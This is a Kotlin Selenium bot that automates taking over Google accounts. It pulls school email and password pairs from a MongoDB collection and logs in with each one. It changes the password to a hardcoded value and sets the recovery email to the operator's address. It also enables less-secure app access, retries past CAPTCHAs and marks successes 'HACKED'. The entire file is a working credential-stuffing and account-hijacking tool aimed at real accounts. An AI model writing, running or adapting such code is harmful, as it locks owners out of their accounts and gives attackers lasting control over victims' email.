package net.scr0pt.bot.google

import net.scr0pt.selenium.Page
import net.scr0pt.selenium.PageManager
import net.scr0pt.selenium.Response
import com.mongodb.client.MongoClients
import com.mongodb.client.MongoCollection
import com.mongodb.client.model.Updates
import net.scr0pt.crawl.school.random
import net.scr0pt.selenium.GoogleResponse
import net.scr0pt.thirdservice.mongodb.MongoConnection
import org.bson.Document
import net.scr0pt.utils.webdriver.Browser
import org.jsoup.select.Selector.selectFirst


fun main() {
    DoHackGoogle().run()
}


class DoHackGoogle() {
    var driver = Browser.firefox
    val mongoClient = MongoClients.create(MongoConnection.eduConnection)
    val serviceAccountDatabase = mongoClient.getDatabase("edu-school-account")
    val collection: MongoCollection<Document> = serviceAccountDatabase.getCollection("vimaru-email-info")

     fun run() {
        while (true) {
            collection.random(org.bson.Document("login_status", null).append("email_status", null))
                    ?.let { googleRun(it) }
        }
    }

     fun googleRun(doc: org.bson.Document) {
        val email = doc.getString("email") ?: return
        println(email)
        val pass = doc.getString("pass") ?: return
        println(pass)
        val recoverEmail = "scr0pt.son@gmail.com"
        val newPassword = "TheMatrix@1999"


        PageManager(driver,
                "https://accounts.google.com/signin/v2/identifier?hl=vi&passive=true&continue=https%3A%2F%2Fwww.google.com%2F&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
        ).apply {
            addPageList(arrayListOf<Page>(
                    LoginEnterEmailPage(email) {
                        println("enter email success")
                    },
                    LoginEnterPasswordPage(pass) {
                        println("enter password success")
                        update(email, "login_status", "PASSWORD_CORRECT")
                    },
                    WellcomeToNewAccount {
                        update(email, "email_status", "HACKED")
                        println("WellcomeToNewAccount success")
                    },
                    ChangePasswordFirstTime(newPassword) {
                        update(email, "email_status", "HACKED")
                        update(email, "new_pass", newPassword)
                        println("ChangePasswordFirstTime success")
                    },
                    EnterPasswordFirstTimeChanged(newPassword) {
                        println("EnterPasswordFirstTimeChanged success")
                    },
                    ProtectYourAccount(ProtectYourAccount.DEFAULT_ACTION.UPDATE) {
                        //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
                        println("ProtectYourAccount success")
                    },
                    ProtectYourAccountUpdatePhone() {
                        println("ProtectYourAccountUpdatePhone success")
                    },
                    ProtectYourAccountUpdateRecoverEmail(recoverEmail) {
                        println("ProtectYourAccountUpdateRecoverEmail success")
                        update(email, "recover_email", recoverEmail)
                    },
                    ProtectYourAccountUpdateRecoverEmailSuccess {
                        update(email, "recover_email", recoverEmail)
                        println("ProtectYourAccountUpdateRecoverEmailSuccess success")
                    },
                    GoogleSearch {
                        //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
                        println("GoogleSearch success")
                    },
                    AccountDisable {
                        //                    collection.updateOne(
//                        Document("email", email),
//                        Updates.combine(Updates.set("hacked", "AccountDisable"))
//                    )
                        println("AccountDisable success")
                    },
                    VerifyItsYouAction {
                        println("VerifyItsYouAction success")
                    },
                    VerifyItsYouPhoneNumber {
                        //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
                        println("VerifyItsYou success")
                    },
                    VerifyItsYouPhoneNumberRecieveMessage {
                        println("VerifyItsYouPhoneNumberRecieveMessage success")
                    },
                    CantLoginForYou {
                        //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
                        println("CantLoginForYou success")
                    }
            ))

            generalWatingResult = {pageStatus ->
                if ((pageStatus.doc?.selectFirst("img#captchaimg")?.attr("src")?.length ?: 0) > 5) {
                    GoogleResponse.RECAPTCHA()
                } else Response.WAITING()
            }

            run { pageResponse ->
                when (pageResponse) {
                    is Response.OK -> {
                        update(email, "email_status", "HACKED")
                        allowLessSecureApps(driver, email, collection)
                        driver.renew(Browser.firefox)
                    }
                    is GoogleResponse.NOT_FOUND_EMAIL -> {
                        update(email, "email_status", "NOT_EXIST")
                    }
                    is GoogleResponse.INCORECT_PASSWORD, is GoogleResponse.PASSWORD_CHANGED -> {
                        update(email, "login_status", "PASSWORD_INCORRECT")
                    }
                    is GoogleResponse.RECAPTCHA -> {
                        driver.renew(Browser.firefox)
                    }
                    is Response.NOT_FOUND_ELEMENT -> {
                    }
                    is Response.WAITING -> {
                    }
                }
                println(pageResponse)
                Thread.sleep(10000)
            }
        }
    }

    fun update(email: String, key: String, value: String) {
        println("Update set $key to $value when email is $email")
        collection.updateOne(Document("email", email), Updates.combine(Updates.set(key, value)))
    }
}